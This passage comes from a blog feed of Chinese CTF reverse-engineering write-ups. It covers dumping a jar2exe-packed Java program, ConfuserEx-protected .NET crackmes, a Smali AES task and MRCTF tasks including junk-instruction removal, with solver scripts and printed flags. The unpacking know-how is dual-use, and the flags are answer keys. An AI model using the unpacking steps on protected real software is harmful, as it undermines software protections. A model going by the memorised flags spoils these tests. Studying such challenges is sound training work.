title="Level2"></a>Level2</h5><p>第二种方式隐藏了原本的<code>jar</code>文件，可以通过<code>RH</code>来查看文件，这部分被放在了<code>RCData</code>里</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/2.png" alt="1"></p><h5 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h5><p>本题采用的是第三种，就像第二种一样，原先的<code>jar</code>文件被隐藏了，但是第三种方式还进行加密，并且将整个<code>jar</code>文件的结构和类名全部都混淆了(经过实验在<code>jar2exe 2.1.2</code>中并不会对文件结构进行破坏)，不会像第二种方式中直接<code>dump</code>出来一个完整的<code>jar</code>文件</p><h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p>要解决这道题首先就是要把有效的代码<code>Dump</code>出来，这部分的内容对于第二种和第三种方式是基本一样的。</p><p>从上面可以看到这段密文的偏移，然后<code>x64dbg</code>打开之后，在程序内存处根据偏移找到这段内存，设内存访问断点，程序运行起来，在<code>dec r8d</code>处停下来，此时如果是采用第二种方式加密，经过一个简单的循环之后就可以把原<code>jar</code>给<code>dump</code>出来，但是这里还需要经过一些加密</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/3.png" alt="3"></p><p>根据脱壳的经验，找到向上跳转的最外层，就是最后一个跳转，然后直接执行到下一行</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/4.png" alt="4"></p><p>首先观察变红色的值即发生改变的值，发现<code>r14</code>和<code>r15</code>的值很可疑，观察前面的代码，发现会在循环处<code>inc r15d</code>和<code>inc r14</code>，根据这两个寄存器的值推断，<code>r14</code>中的值是解密后数据的结束位置，<code>r15</code>中的值<code>B8B</code>为解密后数据的长度，因此，利用<code>Scylla</code>把这部分内容<code>dump</code>出来，出题人使用的<code>jar2exe</code>版本里面的文件名都是混淆过的，需要手动修复成<code>jar</code>文件，找到其中的两个<code>class</code>文件，<code>IDEA</code>直接就可以反编译。</p><h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p><code>dump</code>出来的文件包含了两个类，第一个类包含主要的处理过程</p><pre><code class="java">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package top.phrack.ctf.Fibonacci;import java.util.Scanner;public class Fibonacci &#123;    public Fibonacci() &#123;    &#125;    private static void heheda() &#123;        String bb = new String(b.x);        String cb = new String(b.y);        hello(cb, bb);    &#125;    public static void main(String[] args) &#123;        System.out.println(&quot;来让我们玩一个数列游戏：&quot;);        System.out.println(&quot;a[0]=0,a[1]=1&quot;);        System.out.println(&quot;a[2]=1,a[3]=2&quot;);        System.out.println(&quot;a[4]=3,a[5]=5&quot;);        System.out.println(&quot;..............&quot;);        System.out.println(&quot;请计算a[100000000000000]：&quot;);        Scanner scan = new Scanner(System.in);        String read = scan.nextLine();        System.out.println(&quot;答案错误！！&quot;);    &#125;    private static String hello(String aaa, String bbb) &#123;        int[] iS = new int[256];        byte[] iK = new byte[256];        int j;        for(j = 0; j &lt; 256; iS[j] = j++) &#123;        &#125;        int j = true;        for(short i = 0; i &lt; 256; ++i) &#123;            iK[i] = (byte)bbb.charAt(i % bbb.length());        &#125;        j = 0;        int i;        for(i = 0; i &lt; 255; ++i) &#123;            j = (j + iS[i] + iK[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;        &#125;        i = 0;        j = 0;        char[] iInputChar = aaa.toCharArray();        char[] iOutputChar = new char[iInputChar.length];        for(short x = 0; x &lt; iInputChar.length; ++x) &#123;            i = (i + 1) % 256;            j = (j + iS[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;            int t = (iS[i] + iS[j] % 256) % 256;            int iY = iS[t];            char iCY = (char)iY;            iOutputChar[x] = (char)(iInputChar[x] ^ iCY);        &#125;        return new String(iOutputChar);    &#125;&#125;</code></pre><p>由此可见什么斐波那契数列并没有什么用，真正有用的是<code>heheda()</code>和<code>hello()</code>，其中调用了<code>b</code>类的数据</p><pre><code class="java">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package top.phrack.ctf.Fibonacci;public class b &#123;    public static char[] x = new char[]&#123;&#39;&#125;&#39;, &#39;\u0010&#39;, &#39;ý&#39;, &#39;É&#39;, &#39;\u000b&#39;, &#39;\u0016&#39;, &#39;9&#39;, &#39;D&#39;, &#39;7&#39;, &#39;,&#39;, &#39; &#39;, &#39;Í&#39;&#125;;    public static char[] y = new char[]&#123;&#39;t&#39;, &#39;\u0096&#39;, &#39;®&#39;, &#39;D&#39;, &#39;´&#39;, &#39;Z&#39;, &#39;Ö&#39;, &#39;½&#39;, &#39;O&#39;, &#39;5&#39;, &#39;\u0085&#39;, &#39;\n&#39;, &#39;+&#39;, &#39;+&#39;, &#39;½&#39;, &#39;Ù&#39;, &#39;O&#39;, &#39;`&#39;, &#39;\u0013&#39;, &#39;\u008a&#39;, &#39;Ç&#39;, &#39;\u0080&#39;, &#39;@&#39;, &#39;Ü&#39;, &#39;Þ&#39;, &#39;ê&#39;, &#39;\u000b&#39;, &#39;¯&#39;, &#39;ä&#39;, &#39;\u0081&#39;&#125;;    public b() &#123;    &#125;&#125;</code></pre><p>所以直接在<code>java</code>环境里运行一下就可以了</p><pre><code class="java">//Main.javapackage com.company;public class Main &#123;    private static void heheda() &#123;        String bb = new String(b.x);        String cb = new String(b.y);        System.out.println(hello(cb, bb));    &#125;    public static void main(String[] args) &#123;        heheda();    &#125;    private static String hello(String aaa, String bbb) &#123;        int[] iS = new int[256];        byte[] iK = new byte[256];        int j;        for (j = 0; j &lt; 256; iS[j] = j++) &#123;        &#125;        for (short i = 0; i &lt; 256; ++i) &#123;            iK[i] = (byte) bbb.charAt(i % bbb.length());        &#125;        j = 0;        int i;        for (i = 0; i &lt; 255; ++i) &#123;            j = (j + iS[i] + iK[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;        &#125;        i = 0;        j = 0;        char[] iInputChar = aaa.toCharArray();        char[] iOutputChar = new char[iInputChar.length];        for (short x = 0; x &lt; iInputChar.length; ++x) &#123;            i = (i + 1) % 256;            j = (j + iS[i]) % 256;            int temp = iS[i];            iS[i] = iS[j];            iS[j] = temp;            int t = (iS[i] + iS[j] % 256) % 256;            int iY = iS[t];            char iCY = (char) iY;            iOutputChar[x] = (char) (iInputChar[x] ^ iCY);        &#125;        return new String(iOutputChar);    &#125;&#125;//b.javapackage com.company;public class b &#123;    public static char[] x = new char[]&#123;&#39;&#125;&#39;, &#39;\u0010&#39;, &#39;ý&#39;, &#39;É&#39;, &#39;\u000b&#39;, &#39;\u0016&#39;, &#39;9&#39;, &#39;D&#39;, &#39;7&#39;, &#39;,&#39;, &#39; &#39;, &#39;Í&#39;&#125;;    public static char[] y = new char[]&#123;&#39;t&#39;, &#39;\u0096&#39;, &#39;®&#39;, &#39;D&#39;, &#39;´&#39;, &#39;Z&#39;, &#39;Ö&#39;, &#39;½&#39;, &#39;O&#39;, &#39;5&#39;, &#39;\u0085&#39;, &#39;\n&#39;, &#39;+&#39;, &#39;+&#39;, &#39;½&#39;, &#39;Ù&#39;, &#39;O&#39;, &#39;`&#39;, &#39;\u0013&#39;, &#39;\u008a&#39;, &#39;Ç&#39;, &#39;\u0080&#39;, &#39;@&#39;, &#39;Ü&#39;, &#39;Þ&#39;, &#39;ê&#39;, &#39;\u000b&#39;, &#39;¯&#39;, &#39;ä&#39;, &#39;\u0081&#39;&#125;;    public b() &#123;    &#125;&#125;</code></pre><p>运行直接输出flag</p><pre><code>PCTF&#123;1ts_not_5c2ipt_Chall3nge&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> re </tag>
            
            <tag> Javis OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javis-OJ-wp</title>
      <link href="/2020/04/01/Javis-OJ-wp/"/>
      <url>/2020/04/01/Javis-OJ-wp/</url>
      
        <content type="html"><![CDATA[<p>Javis OJ的题目还是很不错的，可以仔细研究研究</p><span id="more"></span><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="Findkey"><a href="#Findkey" class="headerlink" title="Findkey"></a>Findkey</h4><p><code>DIE</code>看看发现是<code>pyc</code>文件，试一下<code>uncompyle6</code>发现直接成功没加任何保护，看看代码</p><pre><code class="python">import syslookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]flag = raw_input(&#39;Input your Key:&#39;).strip()if len(flag) != 17:    print &#39;Wrong Key!!&#39;    sys.exit(1)flag = flag[::-1]for i in range(0, len(flag)):    if ord(flag[i]) + pwda[i] &amp; 255 != lookup[(i + pwdb[i])]:        print &#39;Wrong Key!!&#39;        sys.exit(1)print &#39;Congratulations!!&#39;</code></pre><p>简单写个脚本逆一下</p><pre><code class="python">lookup = [    196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2,    245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224,    69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73,    148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22,    55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186,    0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113,    79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185,    183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9,    136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208,    207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120,    195, 45, 4, 142, 139]pwda = [    188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]flag = &#39;&#39;for i in range(17):    index = 16 - i    flag += chr((lookup[(index + pwdb[index])] - pwda[index])&amp;255)print(flag)# PCTF&#123;PyC_Cr4ck3r&#125;</code></pre><h4 id="Classical-Crackme"><a href="#Classical-Crackme" class="headerlink" title="Classical Crackme"></a>Classical Crackme</h4><p>这题有<code>confuser</code>的混淆，想脱掉这个壳有点困难，所以先看看代码</p><pre><code class="c#">private void \u202C\u200B\u206A\u202A\u206D\u206B\u202D\u206F\u202D\u200C\u200E\u206B\u202E\u202E\u202C\u202B\u206A\u206D\u206E\u202B\u206E\u200F\u202D\u200E\u202C\u200F\u200D\u200F\u202B\u200C\u202A\u206D\u206A\u206E\u202D\u200D\u200C\u206B\u202A\u202D\u202E(object A_1, EventArgs A_2)    &#123;        string s = this.\u200E\u206F\u206A\u200F\u206E\u202C\u206C\u200C\u206A\u200B\u206E\u202D\u206B\u202D\u200F\u206B\u202B\u200C\u206B\u202D\u206D\u202B\u206B\u200C\u206F\u206D\u206A\u202D\u200F\u202E\u200B\u206D\u202C\u200D\u200D\u202C\u200F\u202E\u202E\u206A\u202E.Text.ToString();        byte[] bytes = Encoding.Default.GetBytes(s);        string a = Convert.ToBase64String(bytes);        string b = &quot;UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==&quot;;        if (a == b)        &#123;            MessageBox.Show(&quot;注册成功！&quot;, &quot;提示&quot;, MessageBoxButtons.OK);        &#125;        else        &#123;            MessageBox.Show(&quot;注册失败！&quot;, &quot;提示&quot;, MessageBoxButtons.OK, MessageBoxIcon.Hand);        &#125;    &#125;</code></pre><p>找到关键部分，发现是简单对输入<code>base64</code>处理，然后直接对比，所以<code>base64</code>解码之后就可以了</p><h4 id="Classic-Crackme2"><a href="#Classic-Crackme2" class="headerlink" title="Classic Crackme2"></a>Classic Crackme2</h4><p>这题和上一个基本相似，也是<code>c#</code>+<code>confuser</code>，不过这次想直接找到关键代码有点困难，所以调试解决，在主函数下断点</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-1.png" alt="Classic_Crackme-1"></p><p>断点处这一串奇怪的字符串名应该就是关键的类，启动调试，跟进去</p><p>调试过程中发现了关键的比较</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-2.png" alt="Classic_Crackme-2"></p><p><code>text1</code>是我们的输入，去看看<code>text2</code>是什么</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-3.png" alt="Classic_Crackme-3"></p><p>发现加密方式是<code>AES-ECB</code>方式加密，填充方式也已知，<code>key</code>在局部变量窗口可以获得，最后应该还有个比较，接着调试</p><p><img src="/2020/04/01/Javis-OJ-wp/Classic_Crackme-4.png" alt="Classic_Crackme-4"></p><p>发现了我们的输入被加密之后和另一串进行了一个比较，然后就可以写个脚本来跑一跑</p><pre><code class="python">import base64from Crypto.Cipher import AEScipher = &quot;x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=&quot;cipher = base64.b64decode(cipher)key=&quot;pctf2016pctf2016pctf2016pctf2016&quot;cryptor = AES.new(key, AES.MODE_ECB)plain_text = cryptor.decrypt(cipher)print(plain_text)#b&#39;PCTF&#123;Dot_Net_UnPack3r_yoo&#125;\x06\x06\x06\x06\x06\x06&#39;</code></pre><h4 id="Smali"><a href="#Smali" class="headerlink" title="Smali"></a>Smali</h4><p><code>Smali</code>的语法我还是不是很会，不过这题比较简单，可以很容易看出来，也是简单的AES加密</p><pre><code class="python">import base64from Crypto.Cipher import AEScipher = &quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;cipher = base64.b64decode(cipher)key = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;key = base64.b64decode(key)cryptor = AES.new(key, AES.MODE_ECB)plain_text = cryptor.decrypt(cipher)print(plain_text)#b&#39;PCTF&#123;Sm4liRiver&#125;&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> re </tag>
            
            <tag> Javis OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF-wp</title>
      <link href="/2020/03/30/MRCTF-wp/"/>
      <url>/2020/03/30/MRCTF-wp/</url>
      
        <content type="html"><![CDATA[<p>最近招新事情实在是有点多，这比赛只打了半天，做了几道re和简单的pwn，随便写一下</p><span id="more"></span><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h4><p>太简单了没什么好说的，直接上代码</p><pre><code class="c++">#include&lt;iostream&gt;#include &quot;ida.h&quot;using namespace std;int main()&#123;    signed int dword_40F040[33] =            &#123;                    9,                    10,                    15,                    23,                    7,                    24,                    12,                    6,                    1,                    16,                    3,                    17,                    32,                    29,                    11,                    30,                    27,                    22,                    4,                    13,                    19,                    20,                    21,                    2,                    25,                    5,                    31,                    8,                    18,                    26,                    28,                    14,                    0            &#125;;    char target[33] =            &#123;                    103,                    121,                    123,                    127,                    117,                    43,                    60,                    82,                    83,                    121,                    87,                    94,                    93,                    66,                    123,                    45,                    42,                    102,                    66,                    126,                    76,                    87,                    121,                    65,                    107,                    126,                    101,                    60,                    92,                    69,                    111,                    98,                    77            &#125;;    char tmp[33];    char flag[33];    for(int i=0;i&lt;=32;i++)    &#123;        tmp[i]=target[i]^LOBYTE(dword_40F040[i]);        flag[dword_40F040[i]]=tmp[i];    &#125;    cout&lt;&lt;flag&lt;&lt;endl;    return 0;&#125;</code></pre><h4 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h4><p>简单的<code>lua</code>，用了<code>smc</code>，但是调试可以之间看到执行的代码，复制出来即可</p><pre><code class="lua">cmps=&#123;&#123;83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97&#125;&#125;print(\&quot;Give Me Your Flag LOL!:\&quot;)flag=io.read()if string.len(flag)~=28 then    print(\&quot;Wrong flag!\&quot;)    os.exit()endfor i=1,string.len(flag) do    local x=string.byte(flag,i)    if i%2==0 then        x=x~i    else        x=x+6    end    if x~=cmps[i] then        print(\&quot;Wrong flag!\&quot;)        os.exit()    endendprint(\&quot;Right flag!\&quot;)os.exit()</code></pre><p>判断的逻辑也很简单，分奇偶进行不同的操作，用python跑一遍就可以出来flag</p><pre><code class="python">cmps = [83, 80, 73, 80, 76, 125, 61, 96, 107, 85, 62, 63, 121, 122, 101, 33, 123, 82, 101, 114, 54, 100, 101, 97, 85,        111, 39, 97]flag=&#39;&#39;for i in range(28):    x = cmps[i]    if (i + 1) % 2 == 0:        x ^= (i + 1)    else:        x -= 6    flag+=chr(x)print(flag)</code></pre><h4 id="PixelShooter"><a href="#PixelShooter" class="headerlink" title="PixelShooter"></a>PixelShooter</h4><p>游戏我是一点都不会打，直接解包找到<code>dll</code>在字符串视图可以直接看到<code>flag</code></p><h4 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h4><p>乱七八糟看了就觉得头疼的<code>go</code></p><p>找到主函数</p><pre><code class="c++">__int64 __fastcall main_main(__int64 a1, __int64 a2)&#123;  __int64 v2; // r8  __int64 v3; // r9  __int64 v4; // r8  __int64 v5; // r9  __int64 v6; // rdx  __int64 v7; // r8  __int64 v8; // rcx  __int64 v9; // rdx  __int64 v10; // r9  signed __int64 v11; // rax  __int64 result; // rax  __int64 v13; // ST58_8  __int64 *v14; // [rsp+8h] [rbp-A8h]  char v15; // [rsp+18h] [rbp-98h]  __int64 *v16; // [rsp+60h] [rbp-50h]  __int128 v17; // [rsp+68h] [rbp-48h]  void *v18; // [rsp+78h] [rbp-38h]  void **v19; // [rsp+80h] [rbp-30h]  __int128 v20; // [rsp+88h] [rbp-28h]  __int128 v21; // [rsp+98h] [rbp-18h]  if ( (unsigned __int64)&amp;v19 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )    runtime_morestack_noctxt();  runtime_newobject(a1, a2);  v16 = v14;  *(_QWORD *)&amp;v21 = &amp;unk_4AC9C0;  *((_QWORD *)&amp;v21 + 1) = &amp;off_4EA530;  fmt_Fprint(a1, a2, (__int64)&amp;v21, (__int64)&amp;unk_4AC9C0, v2, v3, (__int64)&amp;off_4EBDA0, qword_577550);  *(_QWORD *)&amp;v20 = &amp;unk_4A96A0;  *((_QWORD *)&amp;v20 + 1) = v16;  fmt_Fscanf(    a1,    a2,    (__int64)&amp;off_4EBD80,    (__int64)&amp;v20,    v4,    v5,    (__int64)&amp;off_4EBD80,    qword_577548,    (__int64)&amp;unk_4D07C9,    2LL);  v8 = v16[1];  if ( v8 != 24 )    goto LABEL_3;  v13 = *v16;  runtime_memequal(a1, a2, v6, (unsigned __int64)&amp;unk_4D3C58);  if ( !v15 )  &#123;    v8 = 24LL;LABEL_3:    runtime_cmpstring(a1, a2, (__int64)&amp;unk_4D3C58, v8, v7);    if ( (signed __int64)&amp;v20 &gt;= 0 )      v11 = 1LL;    else      v11 = -1LL;    goto LABEL_5;  &#125;  v11 = 0LL;LABEL_5:  if ( v11 )  &#123;    *(_QWORD *)&amp;v17 = &amp;unk_4AC9C0;    *((_QWORD *)&amp;v17 + 1) = &amp;off_4EA550;    result = fmt_Fprintln(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550);  &#125;  else  &#123;    v18 = &amp;unk_4AC9C0;    v19 = &amp;off_4EA540;    result = fmt_Fprintln(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550);  &#125;  return result;&#125;</code></pre><p>看到了输出提示语，然后输入，最后进行字符串比较，输出正误，没见到有什么特殊的处理，猜测直接<code>flag</code>明文比较，点进去，得到<code>flag</code></p><pre><code>flag&#123;hello_world_gogogo&#125;</code></pre><h4 id="junk"><a href="#junk" class="headerlink" title="junk"></a>junk</h4><p>这一题还像是一道正常难度的re……</p><p><img src="/2020/03/30/MRCTF-wp/junk-1.png" alt="junk-1"></p><p>看起来很正常的流程图，但是接下来就发现<code>F5</code>大法不好使了，猜测题目<code>junk</code>的意思应该是加了混淆，所以干脆直接看汇编</p><p>题目需要输入一个字符串并存储到了<code>0x4216A0</code>的位置，在<code>loc_401200</code>内进行判断，通过<code>eax</code>来判别是否正确，直接<code>call</code>一个位置说明在这个判断函数里动了很多手脚，进去看看</p><p><del>然后发现简直乱七八糟</del></p><pre><code class="asm">.text:00401200 loc_401200:                             ; CODE XREF: sub_401390+1E↓p.text:00401200                 push    ebp.text:00401201                 mov     ebp, esp.text:00401203                 sub     esp, 3Ch.text:00401206                 push    ebx.text:00401207                 push    esi.text:00401208                 push    edi.text:00401209                 mov     eax, [ebp+4].text:0040120C                 sub     esp, 0E9h.text:00401212                 push    eax.text:00401213                 mov     dword ptr [ebp-8], offset unk_4216A0.text:0040121A                 mov     eax, [ebp-8].text:0040121D                 add     eax, 1.text:00401220                 mov     [ebp-1Ch], eax.text:00401223.text:00401223 loc_401223:                             ; CODE XREF: .text:00401233↓j.text:00401223                 mov     ecx, [ebp-8].text:00401226                 mov     dl, [ecx].text:00401228                 mov     [ebp-1], dl.text:0040122B                 add     dword ptr [ebp-8], 1.text:0040122F                 cmp     byte ptr [ebp-1], 0.text:00401233                 jnz     short loc_401223.text:00401235                 mov     eax, [ebp-8].text:00401238                 sub     eax, [ebp-1Ch].text:0040123B                 mov     [ebp-20h], eax.text:0040123E                 mov     ecx, [ebp-20h].text:00401241                 mov     [ebp-24h], ecx.text:00401244                 cmp     dword ptr [ebp-24h], 2Bh.text:00401248                 jz      short loc_401251.text:0040124A                 xor     al, al.text:0040124C                 jmp     loc_401387</code></pre><p>这段的意思实际上就是判断了一下字符串的长度为<code>0x2B</code>，然后进行了一个跳转，如果长度不为<code>0x2B</code>，跳转到结束部分，如果是，进行下一步的处理，然后发现下一步有个花指令</p><pre><code class="asm">loc_401251:                             ; CODE XREF: .text:00401248↑j.text:00401251                 call    sub_401275.text:00401256                 call    near ptr 2BFF088Eh.text:00401256 ; ---------------------------------------------------------------------------.text:0040125B                 db    0.text:0040125C                 db    0.text:0040125D                 db    0.text:0040125E                 db 33h.text:0040125F                 db 0C0h.text:00401260                 db 8Ah.text:00401261                 db  86h.text:00401262                 db  9Fh ; OFF32 SEGDEF [_data,42169F].text:00401263                 db  16h.text:00401264                 db  42h ; B.text:00401265                 db    0.text:00401266                 db 34h.text:00401267                 db    3.text:00401268                 db 88h.text:00401269                 db  86h.text:0040126A                 db  9Fh ; OFF32 SEGDEF [_data,42169F].text:0040126B                 db  16h.text:0040126C                 db  42h ; B.text:0040126D                 db    0.text:0040126E                 db 4Eh.text:0040126F                 db 85h.text:00401270                 db 0F6h.text:00401271                 db 75h.text:00401272                 db 0EBh.text:00401273                 db 0EBh</code></pre><p>开始变得乱七八糟，看一下<code>call</code>的函数内容</p><pre><code class="asm">sub_401275      proc near               ; CODE XREF: .text:loc_401251↑p.text:00401275                 pop     eax.text:00401276                 add     eax, 1.text:00401279                 push    eax.text:0040127A                 retn.text:0040127A sub_401275      endp</code></pre><p>这就是个典型的花指令，首先<code>call</code>一个函数，相当于<code>push eip+jmp</code>，这个时候栈顶是<code>eip</code>就是函数执行结束之后需要返回的地址，但是进入这个函数之后发现，这个函数的作用就是把栈顶的<code>old eip</code>弹出到<code>eax</code>，然后<code>+1</code>，再<code>push</code>到栈顶，这使得最后返回的时候跳过了<code>call</code>命令紧接着的那个字节，所以手动去一下花，真正的指令应该是</p><pre><code class="asm"> xor     esi, esi.text:00401259                 mov     esi, 2Bh.text:0040125E.text:0040125E loc_40125E:                             ; CODE XREF: .text:00401271↓j.text:0040125E                 xor     eax, eax.text:00401260                 mov     al, byte ptr (dword_42169C+3)[esi].text:00401266                 xor     al, 3.text:00401268                 mov     byte ptr (dword_42169C+3)[esi], al.text:0040126E                 dec     esi.text:0040126F                 test    esi, esi.text:00401271                 jnz     short loc_40125E.text:00401273                 jmp     short loc_40127B</code></pre><p>对于输入的字符每一个都和3异或得到了新的字符串，这里用的<code>al</code>取低八位实际上没有什么影响，因为输入的字符都在<code>0~255</code>之间，然后接下来还有一个跳转</p><pre><code class="asm">loc_40127B:                             ; CODE XREF: .text:00401273↑j.text:0040127B                 xor     eax, eax.text:0040127D                 jz      short near ptr loc_40127F+1.text:0040127F.text:0040127F loc_40127F:                             ; CODE XREF: .text:0040127D↑j.text:0040127F                 call    near ptr 2BFF08B7h.text:0040127F ; ---------------------------------------------------------------------------.text:00401284                 db    0.text:00401285                 db    0.text:00401286                 db    0.text:00401287                 db  33h ; 3.text:00401288                 db 0C0h, 8Ah, 86h.text:0040128B                 dd offset dword_42169C+3.text:0040128F                 db 8Bh.text:00401290                 dd 74DB33CEh, 0E183E801h, 0F98301h, 0C8C00574h, 0C003EB04h.text:00401290                 dd 868804C0h.text:004012A8                 dd offset dword_42169C+3.text:004012AC                 dd 75F6854Eh, 2BBAD6h.text:004012B4                 db 2 dup(0), 0B9h.text:004012B7                 dd offset unk_4216A0</code></pre><p>又是一个花指令，这个就比较明显，去花</p><pre><code class="asm">loc_401287:                             ; CODE XREF: .text:004012AF↓j.text:00401287                 xor     eax, eax.text:00401289                 mov     al, byte ptr (dword_42169C+3)[esi].text:0040128F                 mov     ecx, esi.text:00401291                 xor     ebx, ebx.text:00401293                 jz      short near ptr loc_401295+1.text:00401295.text:00401295 loc_401295:                             ; CODE XREF: .text:00401293↑j.text:00401295                 call    near ptr 8341F41Dh.text:0040129A                 stc.text:0040129B                 add     [ebp+eax-40h], dh</code></pre><p>又是一个明显的花指令，接着去花，之后就没什么阻碍了</p><pre><code class="asm">loc_40127B:                             ; CODE XREF: .text:00401273↑j.text:0040127B                 xor     eax, eax.text:0040127D                 jz      short loc_401280.text:0040127D ; ---------------------------------------------------------------------------.text:0040127F                 db 0E8h.text:00401280 ; ---------------------------------------------------------------------------.text:00401280.text:00401280 loc_401280:                             ; CODE XREF: .text:0040127D↑j.text:00401280                 xor     esi, esi.text:00401282                 mov     esi, 2Bh.text:00401287.text:00401287 loc_401287:                             ; CODE XREF: .text:004012AF↓j.text:00401287                 xor     eax, eax.text:00401289                 mov     al, byte ptr (dword_42169C+3)[esi].text:0040128F                 mov     ecx, esi.text:00401291                 xor     ebx, ebx.text:00401293                 jz      short loc_401296.text:00401293 ; ---------------------------------------------------------------------------.text:00401295                 db 0E8h.text:00401296 ; ---------------------------------------------------------------------------.text:00401296.text:00401296 loc_401296:                             ; CODE XREF: .text:00401293↑j.text:00401296                 and     ecx, 1.text:00401299                 cmp     ecx, 0.text:0040129C                 jz      short loc_4012A3.text:0040129E                 ror     al, 4.text:004012A1                 jmp     short loc_4012A6.text:004012A3 ; ---------------------------------------------------------------------------.text:004012A3.text:004012A3 loc_4012A3:                             ; CODE XREF: .text:0040129C↑j.text:004012A3                 rol     al, 4.text:004012A6.text:004012A6 loc_4012A6:                             ; CODE XREF: .text:004012A1↑j.text:004012A6                 mov     byte ptr (dword_42169C+3)[esi], al.text:004012AC                 dec     esi.text:004012AD                 test    esi, esi.text:004012AF                 jnz     short loc_401287.text:004012B1                 mov     edx, 2Bh.text:004012B6                 mov     ecx, offset unk_4216A0.text:004012BB                 call    sub_401090.text:004012C0                 mov     dword ptr [ebp-0Ch], 